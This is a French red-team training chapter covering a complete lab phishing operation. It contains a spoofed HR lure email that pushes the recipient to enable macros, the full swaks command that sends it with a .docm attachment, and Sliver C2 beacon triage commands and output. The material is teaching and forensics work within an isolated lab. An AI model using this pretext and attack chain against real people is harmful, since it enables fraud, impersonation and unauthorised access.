---
title: 6.7 Envoi de l'email et capture du beacon - Opération complète
description: Opération finale du module 6. Envoi de l'email phishing depuis l'infrastructure Postfix configurée au 6.2, ouverture du document piégé sur la VM cible, capture de la session beacon dans Sliver. Documentation forensique complète de l'opération.
authors:
  - Zyrass
date:
  created: 2026-05-03
tags:
  - Opération phishing
  - Postfix
  - Beacon
  - Sliver
  - Forensic
data-level: 🔴
---

# 6.7 Envoi de l'email et capture du beacon

!!! quote "L'analogie de l'opération militaire coordonnée"

    Un état-major qui prépare une opération n'improvise pas le jour J. La logistique est prête, les unités sont en position, les communications testées, les objectifs clairement définis, les alternatives prévues. Le signal est donné. Chaque composante s'active dans le bon ordre. L'exécution dure quelques minutes. La préparation a pris des semaines. Vous en êtes là. L'infrastructure Postfix est configurée (6.2), le document est prêt (6.3), le payload est encodé (6.4), le C2 est actif (6.5), la chaîne est validée (6.6). Ce chapitre est le signal. Vous envoyez l'email. Vous attendez. Le beacon rappelle. L'opération du module 6 est complète.

## Métadonnées du chapitre

Ce chapitre est l'opération finale du module 6.

| Champ | Valeur |
|---|---|
| Durée estimée | 2 heures |
| Niveau | Pratique offensive - Opération complète |
| Prérequis | 6.1 à 6.6 complétés et validés |
| Livrables | Email envoyé, beacon capturé, rapport d'opération complet |
| Auto-explication | 10 minutes |

!!! danger "Cadre légal strict - Dernier rappel"

    Ce chapitre simule une opération complète de phishing avec compromission. Le scénario est **entièrement interne au lab ARTECH** : expéditeur, destinataire, serveur mail, VM cible sont tous sous votre contrôle exclusif. Envoyer cet email vers une adresse réelle extérieure au lab, même avec un accord verbal, constitue une infraction aux articles **313-1** (escroquerie), **323-1** (accès frauduleux), et **226-4-1** (usurpation d'identité) du Code pénal. Les peines cumulées peuvent atteindre **10 ans d'emprisonnement**.

## Objectifs pédagogiques

À l'issue de ce chapitre, vous serez capable de :

- Construire un email de phishing complet avec pièce jointe depuis Postfix
- Utiliser swaks pour envoyer un email depuis la ligne de commande
- Simuler la réception et l'ouverture sur la VM cible
- Capturer la session Sliver et exécuter les commandes initiales
- Produire un rapport d'opération forensique complet
- Relier les techniques offensives aux contre-mesures défensives du module

<br>

---

## 1. Cadre juridique et périmètre de l'opération

### 1.1 Articles applicables

| Article | Infraction | Peine |
|---|---|---|
| CP 313-1 | Escroquerie (prétexte email) | 5 ans / 375 000 € |
| CP 323-1 | Accès frauduleux STAD | 3 ans / 100 000 € |
| CP 323-3 | Maintien et modification données | 5 ans / 150 000 € |
| CP 226-4-1 | Usurpation d'identité numérique | 1 an / 15 000 € |
| CP 226-15 | Détournement de correspondances | 1 an / 45 000 € |

### 1.2 Périmètre strict du lab

Voici le périmètre de l'opération. Toute sortie de ce périmètre est illégale.

| Composante | Adresse lab | Statut |
|---|---|---|
| Serveur Postfix (expéditeur) | mail.lab.local (192.168.50.20) | Votre machine |
| Boîte mail "Paul" (destinataire) | paul@lab.local | Votre compte lab |
| VM cible Windows | 192.168.50.100 | Votre machine |
| C2 Sliver | 192.168.50.20:443 | Votre serveur |
| Réseau | 192.168.50.0/24, isolé | Votre lab |

<br>

---

## 2. Préparation de l'email

### 2.1 Construction du prétexte final

L'email doit être cohérent avec le document Word préparé au 6.3.

```text
COMPOSITION EMAIL DE PHISHING LAB
====================================

De        : rh@artech.fr (usurpé via Postfix)
À         : paul.dubois@artech.fr (cible lab)
Objet     : [CONFIDENTIEL] Avenant contrat - À signer avant le 15
Corps     : Voir ci-dessous
PJ        : artech-contrat.docm
```

Corps de l'email.

```text
Bonjour Paul,

Suite à notre réorganisation interne, votre contrat de travail 
fait l'objet d'un avenant incluant vos nouvelles responsabilités.

Ce document est strictement confidentiel. Merci de :
1. Ouvrir la pièce jointe ci-attachée
2. Activer l'affichage du document (macros nécessaires pour la signature)
3. Nous retourner le document signé avant vendredi 15

En cas de question, contactez directement Anne Lefebvre (RH)
au poste 2247.

Cordialement,
Service Ressources Humaines
ARTECH Solutions
Tél : 01 XX XX XX XX
```

_Ce prétexte combine autorité (RH), urgence (délai vendredi 15) et demande d'action précise (ouvrir + activer macros). Il est conçu pour le lab, à partir des cibles identifiées au module 4._

### 2.2 Préparation de la pièce jointe

```bash
# Sur Kali - Vérifier le document final

ls -lh /root/lab/artech-contrat.docm
# Taille attendue : ~50-200 Ko

sha256sum /root/lab/artech-contrat.docm
# Noter le hash dans le journal d'opération

file /root/lab/artech-contrat.docm
# → Microsoft Word 2007+
```

<br>

---

## 3. Envoi depuis Postfix avec swaks

**swaks** (Swiss Army Knife for SMTP) est l'outil de référence pour envoyer des emails en ligne de commande avec contrôle total.

### 3.1 Vérification de l'infrastructure Postfix

```bash
# Vérifier que Postfix est actif (installé au 6.2)
sudo systemctl status postfix
# Active: active (running)

# Tester l'envoi simple avant la pièce jointe
swaks --to paul@lab.local --from rh@artech.fr \
    --server mail.lab.local \
    --header "Subject: Test connexion SMTP" \
    --body "Test de connexion SMTP"

# Vérification logs Postfix
sudo tail -20 /var/log/mail.log
# status=sent : OK
```

### 3.2 Envoi avec pièce jointe MIME

```bash
# Envoi complet avec pièce jointe

swaks \
    --to paul@lab.local \
    --from "Service RH ARTECH <rh@artech.fr>" \
    --server mail.lab.local \
    --port 25 \
    --header "Subject: [CONFIDENTIEL] Avenant contrat - A signer avant le 15" \
    --header "X-Priority: 1" \
    --header "X-MS-Has-Attach: yes" \
    --header "Importance: High" \
    --body "Bonjour Paul,

Suite a notre reorganisation interne, votre contrat de travail
fait l'objet d'un avenant incluant vos nouvelles responsabilites.

Ce document est strictement confidentiel. Merci de :
1. Ouvrir la piece jointe ci-attachee
2. Activer l'affichage du document (macros necessaires pour la signature)
3. Nous retourner le document signe avant vendredi 15

En cas de question, contactez directement Anne Lefebvre (RH)
au poste 2247.

Cordialement,
Service Ressources Humaines
ARTECH Solutions" \
    --attach @/root/lab/artech-contrat.docm \
    --attach-type "application/vnd.ms-word.document.macroEnabled.12" \
    --attach-name "artech-contrat.docm"
```

_Le type MIME `application/vnd.ms-word.document.macroEnabled.12` est le type correct pour les fichiers `.docm`. Certains filtres bloquent les `.docm` sur la base du type MIME._

### 3.3 Vérification de l'envoi

```bash
# Logs Postfix immédiats
sudo tail -f /var/log/mail.log

# Lignes attendues :
# postfix/smtp[xxxx]: status=sent (250 OK)
# postfix/qmgr[xxxx]: removed

# Vérification dans la boîte du destinataire (Dovecot ou Maildir)
ls -la /var/mail/paul/
# ou
cat /var/spool/mail/paul | grep -A 5 "Subject:"
```

<br>

---

## 4. Simulation de la réception sur la VM cible

### 4.1 Accès à la boîte mail depuis la VM Windows

```text
ACCÈS BOÎTE MAIL DEPUIS VM WINDOWS
=====================================

Option 1 : Client Thunderbird (recommandé pour réalisme)
  → Configurer Thunderbird pour paul@lab.local
  → Serveur entrant : IMAP mail.lab.local
  → Serveur sortant : SMTP mail.lab.local
  → Ouvrir le dossier Boîte de réception

Option 2 : Webmail Roundcube (si déployé)
  → http://mail.lab.local
  → Connexion paul / mot de passe lab

Option 3 : Lecture directe (lab simplifié)
  → Copier directement le docm sur la VM via SMB ou HTTP
  → Simuler l'"ouverture de la pièce jointe"
```

### 4.2 Simulation comportement utilisateur

```text
COMPORTEMENT PAUL DUBOIS - SIMULATION
========================================

Contexte :
  Paul est stagiaire technique chez ARTECH.
  Il vient de rejoindre l'équipe (module 4 - OSINT).
  Il n'a pas encore eu de formation cybersécurité.
  Il est en fin de journée, veut finir ses dossiers avant de partir.

Simulation :
  1. Paul ouvre Thunderbird
  2. Voit l'email "CONFIDENTIEL - Avenant contrat"
  3. La source semble être "RH ARTECH" (Display Name rassurant)
  4. Il double-clique sur la pièce jointe .docm
  5. Word s'ouvre
  6. La barre jaune apparaît "Activer le contenu"
  7. Paul clique "Activer le contenu" (urgence + autorité → biais cognitifs)
  8. Le document s'affiche (texte flou intentionnel)
  9. Paul attend... rien de visible ne se passe
  10. Paul referme Word, continue son travail
  11. En arrière-plan : beacon actif
```

<br>

---

## 5. Capture de la session dans Sliver

### 5.1 Réception du premier callback

```bash
# Console Sliver - En attente du premier callback

sliver > beacons
# (vide pendant ~60-75 secondes)

# Premier callback :
# [*] Beacon a1b2c3d4 artech-beacon - 192.168.50.100:50234 (ARTECH\paul.dubois) checked in
#     Windows/amd64 - ARTECH-POSTE01

sliver > beacons
# ID          Name            OS/Arch        User           Last Check-In
# a1b2c3d4    artech-beacon   windows/amd64  ARTECH\paul   il y a 3s
```

### 5.2 Commandes de reconnaissance initiale (triage)

Une fois le beacon actif, voici les commandes de triage initial en contexte offensif.

```bash
# Basculer sur le beacon
sliver > use a1b2c3d4

# Identité et contexte
sliver (artech-beacon) > whoami
# ARTECH\paul.dubois

sliver (artech-beacon) > hostname
# ARTECH-POSTE01

sliver (artech-beacon) > info
# OS            : Windows 10 21H2
# Architecture  : x86_64
# PID           : 8452
# Executable    : C:\Users\paul.dubois\AppData\Local\Temp\svchost32.exe
# Username      : ARTECH\paul.dubois
# UID           : S-1-5-21-...
# GID           : S-1-5-21-...
# Is Admin      : false

# Réseau
sliver (artech-beacon) > ifconfig
# Interface Ethernet0
#   IP : 192.168.50.100/24
#   GW : 192.168.50.1

# Processus (vue partielle)
sliver (artech-beacon) > ps
# PID   PPID  Name              Owner
# ...
# 8452  8212  svchost32.exe     ARTECH\paul.dubois
# 4832  4000  WINWORD.EXE       ARTECH\paul.dubois
# ...
```

_Chaque commande dans un beacon est exécutée lors du prochain callback. Les résultats arrivent donc avec un délai de 0 à 60 secondes selon le timing._

### 5.3 Session interactive pour opérations immédiates

```bash
# Ouvrir une session interactive (moins furtif mais plus rapide)
sliver (artech-beacon) > interactive
# [*] Using beacon's active C2 endpoint: https://192.168.50.20:443
# [*] Session 7a8b9c10 artech-beacon opened

# Basculer sur la session
sliver > sessions
sliver > use 7a8b9c10

# Commandes immédiates (pas de délai)
sliver (artech-beacon) > ls C:\Users\paul.dubois\Desktop
sliver (artech-beacon) > ls C:\Users\paul.dubois\Documents

# Voir les autres utilisateurs du domaine (si accès réseau)
sliver (artech-beacon) > execute net user /domain

# Vérifier si l'on est administrateur
sliver (artech-beacon) > getprivs
```

<br>

---

## 6. Documentation forensique de l'opération

### 6.1 Rapport d'opération complet

Voici le template de rapport d'opération à compléter.

```markdown
# Rapport d'opération - Module 6 - ARTECH Lab
# Date opération : YYYY-MM-DD
# Référence : OP-ARTECH-2026-006

## 1. Contexte

Opération de simulation de phishing dans le cadre du module 6
du cursus forensic OmnyAcademy. Périmètre exclusivement lab isolé.
Autorisation : Auto-mandat (propriétaire de toutes les machines).

## 2. Infrastructure utilisée

| Rôle | Machine | IP |
|---|---|---|
| Attaquant / C2 | Kali (Sliver + Postfix) | 192.168.50.20 |
| Serveur mail | Postfix mail.lab.local | 192.168.50.20 |
| Victime simulée | Windows 10 (Paul Dubois) | 192.168.50.100 |

## 3. Timeline opération

| Timestamp | Événement | Résultat |
|---|---|---|
| YYYY-MM-DD HH:MM | Sliver listener HTTPS démarré | OK |
| HH:MM:SS | Serveur HTTP Python démarré | OK |
| HH:MM:SS | Email envoyé via swaks (Postfix) | status=sent |
| HH:MM:SS | Email reçu dans boîte paul@lab.local | OK |
| HH:MM:SS | Document ouvert sur VM cible | OK |
| HH:MM:SS | Macros activées (clic utilisateur) | OK |
| HH:MM:SS | GET /beacon_xor.bin observé | HTTP 200 |
| HH:MM:SS | svchost32.exe créé dans %TEMP% | OK |
| HH:MM:SS | Premier callback Sliver | Beacon a1b2c3d4 |
| HH:MM:SS | Session interactive ouverte | OK |
| HH:MM:SS | Commande whoami exécutée | ARTECH\paul.dubois |
| HH:MM:SS | Opération terminée - snapshot restauré | OK |

## 4. Hashes des artefacts

| Artefact | SHA-256 |
|---|---|
| artech-contrat.docm | xxxx |
| beacon.exe (Sliver brut) | xxxx |
| beacon_xor.bin (encodé) | xxxx |
| loader (si utilisé) | xxxx |

## 5. Artefacts collectés

- Capture réseau : OP-ARTECH-2026-006.pcap
- Export logs Postfix : /var/log/mail.log (extrait)
- Screenshot Sliver session active : session-sliver-YYYYMMDD.png
- Export Sysmon VM cible : sysmon-paul-YYYYMMDD.evtx

## 6. Résultats

### Objectifs atteints

- [x] Infrastructure Postfix fonctionnelle avec SPF/DKIM/DMARC
- [x] Email phishing envoyé et reçu
- [x] Document Word piégé exécuté sur VM cible
- [x] Beacon Sliver actif et session ouverte
- [x] Commandes de triage exécutées depuis C2

### Observations

[Détailler ici les points notables, problèmes rencontrés, timing réel vs estimé]

## 7. Contre-mesures identifiées

| Contre-mesure | Aurait bloqué | Étape neutralisée |
|---|---|---|
| GPO macros désactivées | Oui | Étape 3.4 (macro VBA) |
| Email gateway sandbox | Possible | Étape 3.3 (pièce jointe) |
| EDR comportemental | Oui | Étape 3.5 (exécution beacon) |
| DMARC reject sur artech.fr | Partiel | Étape 3.3 (email usurpé) |
| Formation utilisateur | Réduit les probabilités | Étape 4 (clic utilisateur) |

## 8. Signatures forensiques observées

| Type | Valeur | Impact |
|---|---|---|
| Email | Return-Path ≠ From visible | SPF/DMARC détection |
| Fichier | .docm + macro | Gateway filtrage |
| Réseau | GET beacon depuis Word | Proxy / Firewall log |
| Processus | WINWORD → cmd → svchost32 | EDR / Sysmon Event 1 |
| Réseau | HTTPS périodique vers C2 | NDR timing analysis |
```

<br>

---

## 7. Nettoyage post-opération

### 7.1 Procédure de nettoyage

Après chaque test de lab, un nettoyage rigoureux est nécessaire.

```bash
# Sur Kali - Arrêter les services

# Arrêter le listener Sliver
sliver > jobs kill 1

# Arrêter le serveur HTTP
# Ctrl+C dans le terminal Python

# Arrêter le serveur Sliver si plus nécessaire
sudo pkill sliver-server

# Supprimer les artefacts temporaires
rm -f /root/lab/serve/beacon_xor.bin
rm -f /root/lab/serve/artech-contrat.docm

# Archiver les artefacts du test
mkdir -p ~/archives/OP-ARTECH-2026-006/
mv /root/lab/beacon.exe ~/archives/OP-ARTECH-2026-006/
mv /root/lab/beacon_xor.bin ~/archives/OP-ARTECH-2026-006/
```

### 7.2 Restauration VM cible

```text
RESTAURATION VM CIBLE
=======================

Dans VirtualBox / VMware / Proxmox :
  → Éteindre la VM Windows
  → Restaurer le snapshot "avant-test-6.6" pris au 6.6
  → Confirmer la restauration
  → Démarrer la VM restaurée
  → Vérifier que %TEMP% ne contient plus svchost32.exe

Cette étape est OBLIGATOIRE.
La VM doit être propre avant le module 7
(acquisition mémoire Windows - état initial).
```

<br>

---

## 8. Synthèse du module 6

Le module 6 est maintenant complet. Voici la vue d'ensemble de ce qui a été appris et produit.

### 8.1 Récapitulatif des chapitres

| Chapitre | Contenu | Compétences acquises |
|---|---|---|
| 6.1 | Anatomie phishing défensive | Analyse 5 couches, grille SOC |
| 6.2 | Postfix SPF/DKIM/DMARC | Infrastructure mail sécurisée |
| 6.3 | Document Word macro VBA | Dropper Document_Open() |
| 6.4 | Encodage XOR payload | AV evasion statique + limites EDR |
| 6.5 | Sliver C2 | Framework C2 moderne |
| 6.6 | Test chaîne complète | Validation intégration |
| 6.7 | Opération complète | Phishing bout en bout |

### 8.2 Contre-mesures défensives maîtrisées

À l'issue du module, voici la grille de protection complète acquise.

| Menace | Contre-mesure | Efficacité |
|---|---|---|
| Email phishing | SPF + DKIM + DMARC p=reject | Très haute |
| Macro VBA | GPO "Block macros from internet" | Très haute |
| Macro VBA | AMSI pour Office (2019+) | Haute |
| Payload AV evasion | EDR comportemental (API hooking) | Très haute |
| Beacon C2 Sliver | JA3/JA3S Suricata | Haute |
| Beacon timing | RITA / Zeek analysis | Haute |
| Chaîne complète | SIEM corrélation Event 1+3+11 | Très haute |

<br>

---

## 9. Auto-évaluation

Vérifiez votre maîtrise du module complet.

| # | Question | Réponse |
|---|---|---|
| 1 | Outil pour envoyer un email depuis CLI ? | swaks |
| 2 | Type MIME d'un fichier .docm ? | `application/vnd.ms-word.document.macroEnabled.12` |
| 3 | Pourquoi restaurer le snapshot après test ? | Intégrité lab pour modules suivants |
| 4 | Délai entre exécution beacon et premier callback ? | ~60-75s (seconds + jitter) |
| 5 | Biais cognitifs exploités dans le prétexte RH ? | Autorité + urgence |
| 6 | Commande Sliver pour session temps réel depuis beacon ? | `interactive` |
| 7 | Contre-mesure la plus efficace contre les macros ? | GPO macros désactivées |
| 8 | Article juridique pour escroquerie par email ? | CP 313-1 (5 ans / 375 000 €) |

<br>

---

## 10. Synthèse finale du chapitre

```text
OPÉRATION COMPLÈTE - RÉCAPITULATIF
=====================================

CHAÎNE COMPLÈTE MODULE 6
  6.1 Analyse défensive     → Comprendre la menace
  6.2 Postfix SPF/DKIM      → Infrastructure envoi
  6.3 Dropper VBA           → Document piégé
  6.4 Encodage XOR          → Payload discret
  6.5 Sliver C2             → Central de commandement
  6.6 Test intégration      → Répétition générale
  6.7 Opération             → Envoi + capture session

TIMELINE OPÉRATION
  T-∞  : Infrastructure Postfix configurée
  T-0  : Sliver listener HTTPS actif
  T+0  : swaks → email → paul@lab.local
  T+5m : Paul ouvre le document, clique "Activer"
  T+6m : GET beacon_xor.bin depuis Word
  T+7m : svchost32.exe exécuté en mémoire
  T+8m : Premier callback Sliver
  T+9m : Commande whoami → ARTECH\paul.dubois

BILAN DÉFENSIF
  Le phishing humain reste le vecteur n°1 en 2026.
  La chaîne technique est détectable à chaque étape.
  La protection technique sans formation humaine = insuffisant.
  La formation sans protection technique = insuffisant.
  Les deux ensemble → résilience réelle.

PROCHAINE ÉTAPE
  Module 7 : Acquisition mémoire Windows
  → Analyse forensique de la VM cible compromise
  → Ce que le beacon a laissé en mémoire
  → Volatility, Autopsy, RFC 3227
```

## Conclusion

!!! quote "L'attaquant a appris à compromettre - l'analyste apprend maintenant à reconstruire"

> Le module 7 commence exactement là où le module 6 s'arrête : sur un poste Windows compromis par un beacon actif. Vous changerez de rôle. L'analyste forensic prend la main. Il acquiert la mémoire, analyse les artefacts, reconstitue la timeline. Ce que vous venez de construire, il faudra maintenant l'investiguer.

---

**Chapitre précédent** : [6.6 Génération du beacon et test local](06-generation-beacon-test.md)

**Chapitre suivant** : [6.8 Énumération locale Windows - perspective triage](08-enumeration-locale-windows.md)
